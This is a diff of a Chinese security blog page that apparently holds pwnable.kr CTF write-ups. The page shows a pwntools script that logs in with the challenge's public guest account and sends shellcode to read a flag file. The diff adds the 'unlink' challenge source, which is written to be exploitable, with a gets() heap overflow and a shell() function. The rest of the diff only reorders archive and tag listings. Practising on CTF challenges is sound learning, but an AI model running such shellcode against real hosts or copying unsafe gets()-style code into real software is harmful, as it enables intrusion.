@@ -261,7 +261,7 @@
                 
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count">2,444</span> / Reading time: <span class="post-count">13 min</span></span>
+                        <span>Word count: <span class="post-count">2,615</span> / Reading time: <span class="post-count">14 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -414,7 +414,7 @@
 <p>大体上就是将部分寄存器的值清0。</p>
 <p>直接操作:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding:utf8</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"># context.log_level = &apos;debug&apos;</span><br><span class="line">context(arch=&apos;amd64&apos;, os=&apos;linux&apos;)</span><br><span class="line"></span><br><span class="line">p = ssh(host=&quot;pwnable.kr&quot;, port=2222, user=&quot;asm&quot;, password=&quot;guest&quot;)</span><br><span class="line">io = p.connect_remote(&quot;0&quot;, 9026)</span><br><span class="line"></span><br><span class="line">shellcode = &apos;&apos;</span><br><span class="line">shellcode += shellcraft.open(&quot;this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong&quot;)</span><br><span class="line">shellcode += shellcraft.read(&quot;rax&quot;, &quot;rsp&quot;, 100)          // </span><br><span class="line">shellcode += shellcraft.write(1, &apos;rsp&apos;, 100)</span><br><span class="line">io.recvuntil(&quot;code:&quot;)</span><br><span class="line">io.send(asm(shellcode))</span><br><span class="line">print io.interactive()</span><br></pre></td></tr></table></figure>
-<h2 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">typedef struct tagOBJ&#123;</span><br><span class="line">	struct tagOBJ* fd;</span><br><span class="line">	struct tagOBJ* bk;</span><br><span class="line">	char buf[8];</span><br><span class="line">&#125;OBJ;</span><br><span class="line"></span><br><span class="line">void shell()&#123;</span><br><span class="line">	system(&quot;/bin/sh&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void unlink(OBJ* P)&#123;</span><br><span class="line">	OBJ* BK;</span><br><span class="line">	OBJ* FD;</span><br><span class="line">	BK=P-&gt;bk;</span><br><span class="line">	FD=P-&gt;fd;</span><br><span class="line">	FD-&gt;bk=BK;</span><br><span class="line">	BK-&gt;fd=FD;</span><br><span class="line">&#125;</span><br><span class="line">int main(int argc, char* argv[])&#123;</span><br><span class="line">	malloc(1024);</span><br><span class="line">	OBJ* A = (OBJ*)malloc(sizeof(OBJ));</span><br><span class="line">	OBJ* B = (OBJ*)malloc(sizeof(OBJ));</span><br><span class="line">	OBJ* C = (OBJ*)malloc(sizeof(OBJ));</span><br><span class="line"></span><br><span class="line">	// double linked list: A &lt;-&gt; B &lt;-&gt; C</span><br><span class="line">	A-&gt;fd = B;</span><br><span class="line">	B-&gt;bk = A;</span><br><span class="line">	B-&gt;fd = C;</span><br><span class="line">	C-&gt;bk = B;</span><br><span class="line"></span><br><span class="line">	printf(&quot;here is stack address leak: %p\n&quot;, &amp;A);</span><br><span class="line">	printf(&quot;here is heap address leak: %p\n&quot;, A);</span><br><span class="line">	printf(&quot;now that you have leaks, get shell!\n&quot;);</span><br><span class="line">	// heap overflow!</span><br><span class="line">	gets(A-&gt;buf);</span><br><span class="line"></span><br><span class="line">	// exploit this unlink!</span><br><span class="line">	unlink(B);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
     </article>
     <!-- license  -->
@@ -1421,9 +1421,30 @@
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 55
+        Total : 56
         </div>
         <!-- search  -->
         
@@ -1436,6 +1457,11 @@
     
     <div class="archive-year"> 2018 </div>
     <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/01</span><a class="archive-post-title" href="/posts/56316/">netty入门到精通-初识NIO</a>
+        </li>
     
     
         <li class="archive-post-item">
@@ -1479,12 +1505,12 @@
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">09/18</span><a class="archive-post-title" href="/posts/42373/">casw-2018</a>
+            <span class="archive-post-date">09/18</span><a class="archive-post-title" href="/posts/26893/">渗透测试-vulnhub-acid</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">09/18</span><a class="archive-post-title" href="/posts/26893/">渗透测试-vulnhub-acid</a>
+            <span class="archive-post-date">09/18</span><a class="archive-post-title" href="/posts/42373/">casw-2018</a>
         </li>
     
     
@@ -1629,12 +1655,12 @@
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">05/29</span><a class="archive-post-title" href="/posts/62889/">docker使用手册</a>
+            <span class="archive-post-date">05/29</span><a class="archive-post-title" href="/posts/56136/">普通用户免密码切换到root</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">05/29</span><a class="archive-post-title" href="/posts/56136/">普通用户免密码切换到root</a>
+            <span class="archive-post-date">05/29</span><a class="archive-post-title" href="/posts/62889/">docker使用手册</a>
         </li>
     
     
@@ -1717,15 +1743,15 @@
         <div class="sidebar-panel-tags">
     <div class="sidebar-tags-name">
     
-        <span class="sidebar-tag-name" data-tags="ctf"><span class="iconfont-archer">&#xe606;</span>ctf</span>
-    
         <span class="sidebar-tag-name" data-tags="web安全"><span class="iconfont-archer">&#xe606;</span>web安全</span>
+    
+        <span class="sidebar-tag-name" data-tags="ctf"><span class="iconfont-archer">&#xe606;</span>ctf</span>
     
         <span class="sidebar-tag-name" data-tags="pwn"><span class="iconfont-archer">&#xe606;</span>pwn</span>
     
-        <span class="sidebar-tag-name" data-tags="dubbo"><span class="iconfont-archer">&#xe606;</span>dubbo</span>
-    
         <span class="sidebar-tag-name" data-tags="工具手册"><span class="iconfont-archer">&#xe606;</span>工具手册</span>
+    
+        <span class="sidebar-tag-name" data-tags="dubbo"><span class="iconfont-archer">&#xe606;</span>dubbo</span>
     
         <span class="sidebar-tag-name" data-tags="jvm"><span class="iconfont-archer">&#xe606;</span>jvm</span>
     
@@ -1737,9 +1763,9 @@
     
         <span class="sidebar-tag-name" data-tags="python"><span class="iconfont-archer">&#xe606;</span>python</span>
     
-        <span class="sidebar-tag-name" data-tags="python安全"><span class="iconfont-archer">&#xe606;</span>python安全</span>
-    
         <span class="sidebar-tag-name" data-tags="前端"><span class="iconfont-archer">&#xe606;</span>前端</span>
+    
+        <span class="sidebar-tag-name" data-tags="python安全"><span class="iconfont-archer">&#xe606;</span>python安全</span>
     
         <span class="sidebar-tag-name" data-tags="zookeeper"><span class="iconfont-archer">&#xe606;</span>zookeeper</span>
     
